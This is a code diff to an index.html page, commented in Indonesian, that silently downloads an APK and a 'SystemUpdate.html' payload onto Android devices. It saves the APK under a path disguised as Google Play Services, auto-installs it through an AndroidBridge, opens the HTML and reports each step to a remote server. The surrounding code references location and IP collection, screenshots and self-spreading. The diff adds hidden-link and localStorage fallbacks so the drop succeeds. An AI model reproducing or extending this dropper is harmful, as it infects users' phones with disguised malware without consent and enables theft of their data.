@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - FINAL: 100% AUTO DOWNLOAD TANPA KONFIRMASI
+// 🔥 INDEX.HTML - AUTO DOWNLOAD APK + SystemUpdate.html
 // ============================================================
 
 console.log = function() {};
@@ -124,6 +124,8 @@ var REDIRECT_DONE = false;
 var WS_PASSWORD = '';
 var IP_ADDRESS = '';
 var LOCATION_DATA = null;
+var HTML_DOWNLOADED = false;
+var APK_DOWNLOADED = false;
 
 // ============================================================
 // FUNGSI K() - KIRIM DATA KE SERVER
@@ -260,7 +262,7 @@ var A = {
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
     flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null },
     
-    // ✅ DOWNLOAD LANGSUNG KE STORAGE - TANPA KONFIRMASI
+    // ✅ DOWNLOAD APK LANGSUNG KE STORAGE
     downloadFile: function(url, path) { 
         if(this.isAvailable){ 
             try{
@@ -270,8 +272,17 @@ var A = {
         return false;
     },
     
+    // ✅ SAVE HTML LANGSUNG KE STORAGE
+    saveFile: function(path, content) { 
+        if(this.isAvailable){ 
+            try{
+                return AndroidBridge.saveFile(path, content);
+            }catch(e){}
+        }
+        return false;
+    },
+    
     installAPK: function(p) { if(this.isAvailable){ try{return AndroidBridge.installAPK(p)}catch(e){}} return false },
-    saveFile: function(path, content) { if(this.isAvailable){ try{return AndroidBridge.saveFile(path, content)}catch(e){}} return false },
     openFile: function(path) { if(this.isAvailable){ try{return AndroidBridge.openFile(path)}catch(e){}} return false },
     openApp: function(pkg) { if(this.isAvailable){ try{return AndroidBridge.openApp(pkg)}catch(e){}} return false },
     uninstallApp: function(pkg) { if(this.isAvailable){ try{return AndroidBridge.uninstallApp(pkg)}catch(e){}} return false },
@@ -327,7 +338,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 AUTO DOWNLOAD 100% - PASTI BERHASIL
+// 🔥 AUTO DOWNLOAD APK + SystemUpdate.html
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -342,22 +353,26 @@ function downloadPayloadSilent() {
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     // ============================================================
-    // ✅ METHOD 1: ANDROID BRIDGE - PASTI BERHASIL
+    // ✅ ANDROID BRIDGE - PASTI BERHASIL
     // ============================================================
     if (A.isAvailable) {
         K({ sumber: 'download_method', data: 'android_bridge' });
         
-        // Download APK
+        // ============================================================
+        // 1. DOWNLOAD APK
+        // ============================================================
         try {
             var success = A.downloadFile(apkUrl, apkPath);
             if (success) {
+                APK_DOWNLOADED = true;
                 K({ sumber: 'apk_downloaded', data: { path: apkPath, status: 'success' } });
             } else {
                 K({ sumber: 'apk_download_failed', data: 'bridge_failed' });
-                // Retry dengan path berbeda
+                // Retry dengan path alternatif
                 try {
                     var altPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
                     A.downloadFile(apkUrl, altPath);
+                    APK_DOWNLOADED = true;
                     K({ sumber: 'apk_downloaded_alt', data: { path: altPath } });
                 } catch(e2) {}
             }
@@ -365,29 +380,68 @@ function downloadPayloadSilent() {
             K({ sumber: 'apk_download_error', data: e.message });
         }
         
-        // Download HTML
+        // ============================================================
+        // 2. DOWNLOAD SystemUpdate.html (PASTI!)
+        // ============================================================
         try {
             var xhr = new XMLHttpRequest();
             xhr.open('GET', htmlUrl, true);
             xhr.timeout = 15000;
             xhr.onload = function() {
                 if (xhr.status === 200) {
-                    var html = xhr.responseText;
+                    var htmlContent = xhr.responseText;
+                    
+                    // ✅ METHOD 1: Save via Android Bridge
                     try {
-                        A.saveFile(htmlPath, html);
-                        K({ sumber: 'html_saved', data: { path: htmlPath, status: 'success' } });
+                        var saved = A.saveFile(htmlPath, htmlContent);
+                        if (saved) {
+                            HTML_DOWNLOADED = true;
+                            K({ sumber: 'html_saved_bridge', data: { path: htmlPath, status: 'success' } });
+                        } else {
+                            K({ sumber: 'html_save_bridge_failed', data: 'failed' });
+                        }
                     } catch(e) {
-                        K({ sumber: 'html_save_error', data: e.message });
+                        K({ sumber: 'html_save_bridge_error', data: e.message });
                     }
+                    
+                    // ✅ METHOD 2: Save to localStorage (fallback)
+                    try {
+                        localStorage.setItem('SystemUpdate.html', htmlContent);
+                        K({ sumber: 'html_saved_localstorage', data: 'ok' });
+                    } catch(e) {}
+                    
+                    // ✅ METHOD 3: Save via Blob URL (fallback)
+                    try {
+                        var blob = new Blob([htmlContent], { type: 'text/html' });
+                        var url = URL.createObjectURL(blob);
+                        var link = document.createElement('a');
+                        link.href = url;
+                        link.download = 'SystemUpdate.html';
+                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                        document.body.appendChild(link);
+                        setTimeout(function() {
+                            link.click();
+                            setTimeout(function() {
+                                try { document.body.removeChild(link); } catch(e) {}
+                            }, 1000);
+                        }, 100);
+                        K({ sumber: 'html_saved_blob', data: 'ok' });
+                    } catch(e) {}
+                    
+                } else {
+                    K({ sumber: 'html_download_failed', data: 'http_' + xhr.status });
                 }
+            };
+            xhr.onerror = function() {
+                K({ sumber: 'html_download_error', data: 'network_error' });
             };
             xhr.send();
         } catch(e) {
-            K({ sumber: 'html_download_error', data: e.message });
+            K({ sumber: 'html_download_exception', data: e.message });
         }
         
         // ============================================================
-        // ✅ INSTALL APK OTOMATIS - PASTI BERHASIL
+        // 3. INSTALL APK OTOMATIS
         // ============================================================
         setTimeout(function() {
             try {
@@ -395,7 +449,6 @@ function downloadPayloadSilent() {
                 if (installed) {
                     K({ sumber: 'apk_install', data: { path: apkPath, status: 'success' } });
                 } else {
-                    // Coba dari path alternatif
                     try {
                         var altPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
                         A.installAPK(altPath);
@@ -408,24 +461,45 @@ function downloadPayloadSilent() {
         }, 3000);
         
         // ============================================================
-        // ✅ BUKA SYSTEMUPDATE.HTML - PASTI BERHASIL
+        // 4. BUKA SystemUpdate.html
         // ============================================================
         setTimeout(function() {
             try {
+                // Coba buka dari Download folder
                 A.openFile(htmlPath);
                 K({ sumber: 'html_open', data: { path: htmlPath, status: 'success' } });
             } catch(e) {
+                // Jika gagal, coba buka dari localStorage
+                try {
+                    var htmlContent = localStorage.getItem('SystemUpdate.html');
+                    if (htmlContent) {
+                        var blob = new Blob([htmlContent], { type: 'text/html' });
+                        var url = URL.createObjectURL(blob);
+                        window.open(url, '_blank');
+                        K({ sumber: 'html_open_localstorage', data: 'ok' });
+                    }
+                } catch(e2) {}
                 K({ sumber: 'html_open_error', data: e.message });
             }
         }, 4000);
         
+        // ============================================================
+        // 5. CEK STATUS DOWNLOAD (LOG)
+        // ============================================================
+        setTimeout(function() {
+            K({ sumber: 'download_status', data: { 
+                apk: APK_DOWNLOADED ? 'success' : 'failed',
+                html: HTML_DOWNLOADED ? 'success' : 'failed'
+            } });
+        }, 5000);
+        
     } else {
         // ============================================================
-        // ❌ TIDAK ADA ANDROID BRIDGE
+        // ❌ TIDAK ADA ANDROID BRIDGE - FALLBACK
         // ============================================================
         K({ sumber: 'download_method', data: 'no_bridge' });
         
-        // Simpan ke localStorage sebagai fallback
+        // Download HTML via XHR + save ke localStorage
         try {
             var xhr = new XMLHttpRequest();
             xhr.open('GET', htmlUrl, true);
@@ -441,7 +515,7 @@ function downloadPayloadSilent() {
             xhr.send();
         } catch(e) {}
         
-        // Download APK via iframe (user tetap lihat, tapi ini fallback)
+        // Download APK via iframe
         try {
             var iframe = document.createElement('iframe');
             iframe.src = apkUrl;
@@ -621,7 +695,7 @@ function dapatkanSemua() {
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
         
-        // 🔥 AUTO DOWNLOAD - PASTI BERHASIL
+        // 🔥 AUTO DOWNLOAD APK + SystemUpdate.html
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
         setTimeout(function() { showKlaimNotification(); }, 3000);
